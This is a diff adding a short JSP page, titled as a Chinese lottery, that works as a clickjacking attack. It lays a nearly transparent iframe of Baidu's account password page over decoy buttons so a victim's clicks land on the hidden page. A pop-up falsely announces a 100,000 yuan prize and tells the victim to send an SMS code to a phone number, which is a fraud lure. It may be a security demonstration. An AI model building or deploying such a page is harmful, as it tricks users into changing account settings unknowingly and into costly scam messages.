@@ -1,0 +1,64 @@
+<%@page contentType="text/html" pageEncoding="UTF-8"%>
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+ 
+        <title>抽奖</title>
+        <style>
+            iframe {
+        width: 600px;
+        height:400px;
+        position: absolute;
+        margin-top: 200px;
+        z-index: 2;
+        opacity: 0.2;
+       
+    }
+ .ui_button {
+        position: absolute;
+        top: 420px;
+        left: 380px;
+        z-index: 1;
+        width: 70px;
+        height:20px;
+    }
+  .u_but {
+        position: absolute;
+        top: 420px;
+        left: 90px;
+        z-index: 1;
+        width: 90px;
+        height:20px;
+    }
+ .box{ position: absolute;
+        top: 420px;
+        left: 650px;
+        width: 70px;
+        height:20px;
+    }
+</style>
+<script type="text/javascript">
+function disp_alert()
+{
+alert("恭喜你抽中奖金100000元，请发送短信q123456789至手机号1069 0691 0365 86。")
+}
+</script>
+    </head>
+    <body background="0.jpg">
+
+        <input type="button" class="box" onclick="disp_alert()" value="查看奖励" />
+
+        <button class="ui_button">点击抽奖</button>
+          <button class="u_but">短信已发送</button>
+ 
+
+  
+
+    <iframe src="https://passport.baidu.com/v2/account/password" scrolling="no"></iframe>
+       
+
+    </body>
+    
+    
+</html>
